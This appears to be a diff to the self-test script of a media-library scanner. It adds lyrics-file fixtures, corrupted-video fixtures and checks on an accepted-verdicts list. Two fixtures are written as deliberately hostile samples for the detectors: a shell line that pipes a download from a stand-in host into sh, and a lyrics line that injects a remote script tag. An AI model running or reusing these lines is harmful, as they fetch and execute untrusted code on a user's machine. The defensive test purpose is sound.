@@ -15,8 +15,10 @@ never sees them and nothing here can touch real media.
 """
 
 import argparse
+import importlib.util
 import json
 import os
+import random
 import re
 import shutil
 import subprocess
@@ -60,12 +62,15 @@ CASES = (
     Case("clean/Fixture Clean - [Bluray-360p][AVC].mkv", "media"),
     Case("clean/Fixture Clean.srt", "types"),
     Case("clean/Fixture Clean.srt", "subtitles"),
+    Case("clean/Fixture Clean.lrc", "types"),
+    Case("clean/Fixture Clean.lrc", "subtitles"),
 
     Case("types/elf-as-movie.mkv", "types", ("EXECUTABLE", "MISMATCH")),
     Case("types/script-as-subtitles.srt", "types", ("SCRIPT",)),
     Case("types/archive-as-movie.mkv", "types", ("ARCHIVE", "MISMATCH")),
     Case("types/payload.exe", "types", ("DANGEROUS_NAME",)),
     Case("types/eicar.com", "types", ("DANGEROUS_NAME",)),
+    Case("types/script-as-lyrics.lrc", "types", ("SCRIPT",)),
 
     Case("media/cover-art-only.mkv", "media", ("COVER_ART_ONLY",), quarantined=False),
     Case("media/audio-only.mkv", "media", ("NOT_VIDEO",)),
@@ -81,6 +86,12 @@ CASES = (
     Case("subtitles/provider-error-page.srt", "subtitles", ("NOT_SUBTITLE",)),
     Case("subtitles/binary.srt", "subtitles", ("BINARY",)),
     Case("subtitles/no-cues.srt", "subtitles", ("NO_CUES",), quarantined=False),
+
+    # Lyrics are timed lines and tags and nothing else.
+    Case("subtitles/active-lyrics.lrc", "subtitles", ("ACTIVE_CONTENT",)),
+    Case("subtitles/binary-lyrics.lrc", "subtitles", ("BINARY",)),
+    Case("subtitles/binary-lyrics.lrc", "types", ("MISMATCH",), quarantined=False),
+    Case("subtitles/prose-lyrics.lrc", "subtitles", ("NOT_LYRICS", "NO_CUES"), quarantined=False),
 
     # What a container carries inside it. These verdicts are reported, not
     # quarantined: a new detection does not get to move files on the strength
@@ -172,6 +183,23 @@ def build_fixtures(root):
     shutil.copy(clean, os.path.join(root, "deep", "intact.mkv"))
     shutil.copy(os.path.join(root, "media", "cover-art-only.mkv"), os.path.join(root, "deep", "cover-art-only.mkv"))
 
+    # Frames two by two on the same timestamp, which Matroska allows and the
+    # null muxer the check writes to refuses: every frame still decodes, as it
+    # did in eleven episodes on lab2.
+    ffmpeg("-i", base, "-vf", "setpts=floor(N/2)*2/(10*TB)", "-fps_mode", "passthrough",
+           "-c:v", "libx264", "-b:v", VIDEO_BITRATE, "-c:a", "copy",
+           os.path.join(root, "deep", "repeated-timestamps.mkv"))
+
+    # Bit rot through the middle of an otherwise intact file: the header and
+    # the tail parse, so only reading it through can find it.
+    with open(clean, "rb") as source:
+        data = bytearray(source.read())
+    noise = random.Random(7)
+    for at in range(int(len(data) * 0.3), int(len(data) * 0.7), 997):
+        data[at:at + 64] = bytes(noise.randrange(256) for _ in range(64))
+    with open(os.path.join(root, "deep", "bitrot.mkv"), "wb") as target:
+        target.write(data)
+
     shutil.copy(base, os.path.join(root, "media", "codec-lie x265.mkv"))
     encode(os.path.join(root, "media", "resolution-lie 1080p.mkv"), size="320x240")
     encode(os.path.join(root, "media", "too-short.mkv"), duration=5)
@@ -189,6 +217,16 @@ def build_fixtures(root):
     write(os.path.join(root, "subtitles", "binary.srt"),
           "1\n00:00:01,000 --> 00:00:04,000\nA line\0with a NUL\n")
     write(os.path.join(root, "subtitles", "no-cues.srt"), "just some prose, no timings at all\n")
+
+    # Lyrics the way musicguard writes them, and the ways they must not look.
+    write(os.path.join(root, "clean", "Fixture Clean.lrc"),
+          "[ar: Fixture]\n[ti: Clean]\n[00:01.00] A line of the song\n[00:04.50] Another one\n\n[00:08.00]\n")
+    write(os.path.join(root, "types", "script-as-lyrics.lrc"),
+          "#!/bin/sh\ncurl -s http://example.invalid/payload | sh\n")
+    write(os.path.join(root, "subtitles", "active-lyrics.lrc"),
+          "[00:01.00] A line\n[00:02.00] <script src=\"http://example.invalid/x.js\"></script>\n")
+    write(os.path.join(root, "subtitles", "binary-lyrics.lrc"), "[00:01.00] A line\0with a NUL\n")
+    write(os.path.join(root, "subtitles", "prose-lyrics.lrc"), "just some words\nno timings at all\n")
 
     # An attachment declaring itself a font over an ELF binary: the shape the
     # mimetype tag cannot be trusted about.
@@ -365,6 +403,59 @@ def check_deep(root, report_dir, result):
                   "decoding the cover art instead of a feature must not count as a pass")
     result.record(findings.get("intact.mkv") == [], "deep      intact.mkv [must stay clean]",
                   "; ".join(findings.get("intact.mkv") or ["never inspected"]))
+    result.record(bool(findings.get("bitrot.mkv")), "deep      bitrot.mkv",
+                  "damage in the middle of a file read through must not come back clean")
+
+    # Clean, and noted: proves the note path ran rather than the file being skipped.
+    with open(report, encoding="utf-8") as handle:
+        notes = {os.path.basename(e["path"]): e.get("notes") or [] for e in map(json.loads, handle)}
+    result.record(findings.get("repeated-timestamps.mkv") == [] and
+                  any(n.startswith("TIMESTAMPS") for n in notes.get("repeated-timestamps.mkv", [])),
+                  "deep      repeated-timestamps.mkv [clean, noted]",
+                  f"problems {findings.get('repeated-timestamps.mkv')}, notes {notes.get('repeated-timestamps.mkv')}")
+
+
+def check_accepted(report_dir, result):
+    """accepted.txt waves quality notes where they are expected, and nothing else."""
+    spec = importlib.util.spec_from_file_location("summarize", os.path.join(SCRIPT_DIR, "summarize-sweep.py"))
+    summarize = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(summarize)
+
+    directory = os.path.join(report_dir, "accepted")
+    os.makedirs(directory, exist_ok=True)
+    extras = "/data/torrents/tv/Show [Release]/Extras/[BD Menus]/Menu 01.mkv"
+    rows = {
+        extras: ["SHORT: duration 0s is below 60s", "NO_AUDIO: container holds no audio stream"],
+        "/data/torrents/tv/Show [Release]/Extras/payload.mkv": ["SHORT: duration 0s is below 60s",
+                                                                "NOT_VIDEO: container holds no video stream"],
+        "/data/media/tv/Show/Season 01/Episode 01.mkv": ["SHORT: duration 5s is below 60s"],
+    }
+    with open(os.path.join(directory, "media.jsonl"), "w", encoding="utf-8") as handle:
+        for path, problems in rows.items():
+            handle.write(json.dumps({"path": path, "problems": problems}) + "\n")
+    for name in ("types", "subtitles", "clamav", "yara", "virustotal"):
+        open(os.path.join(directory, f"{name}.jsonl"), "w", encoding="utf-8").close()
+    statuses = {"types": "0", "media": "1", "subtitles": "0", "clamav": "0",
+                "yara": "skipped", "virustotal": "skipped"}
+
+    rules = os.path.join(directory, "accepted.txt")
+    write(rules, "/data/torrents/*/extras/*  SHORT NO_AUDIO BITRATE COVER_ART_ONLY\n")
+    text, failed = summarize.summarize(directory, statuses, accepted=rules)
+    result.record("2 files flagged" in text and "accepted 1" in text and failed,
+                  "accepted  menus in Extras accepted; a threat there and an episode elsewhere still flagged",
+                  text.splitlines()[0] + " / " + text.splitlines()[1])
+
+    write(rules, "/data/torrents/*/extras/*  SHORT NOT_VIDEO\n")
+    text, failed = summarize.summarize(directory, statuses, accepted=rules)
+    result.record(failed and "accepted list" in text and "3 files flagged" in text,
+                  "accepted  a line naming a threat verdict is refused", text.splitlines()[0])
+
+    # The list the sweep actually reads holds nothing but quality verdicts.
+    try:
+        summarize.load_accepted(os.path.join(SCRIPT_DIR, "..", "conf", "accepted.txt"))
+        result.record(True, "accepted  conf/accepted.txt is valid")
+    except (OSError, ValueError) as error:
+        result.record(False, "accepted  conf/accepted.txt is valid", str(error))
 
 
 def check_embedded_state(root, report_dir, result):
@@ -432,6 +523,7 @@ def main():
         build_fixtures(root)
         check_detections(root, reports, result)
         check_deep(root, reports, result)
+        check_accepted(reports, result)
         check_embedded_state(root, reports, result)
         check_clamav(root, result)
         check_quarantine(root, result)
